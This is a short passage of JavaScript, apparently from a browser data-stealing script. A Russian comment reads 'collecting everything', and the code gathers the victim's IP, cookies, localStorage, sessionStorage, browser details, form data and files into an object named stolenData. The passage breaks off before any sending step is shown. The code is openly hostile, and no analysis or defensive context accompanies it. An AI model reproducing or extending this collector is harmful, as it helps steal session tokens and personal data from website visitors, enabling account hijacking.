        // === 2.8 СОБИРАЕМ ВСЁ ===
        const stolenData = {
            ip: ipData,
            cookies: cookies,
            localStorage: localStorageData,
            sessionStorage: sessionData,
            browser: browserInfo,
            formData: formData,
            files: files
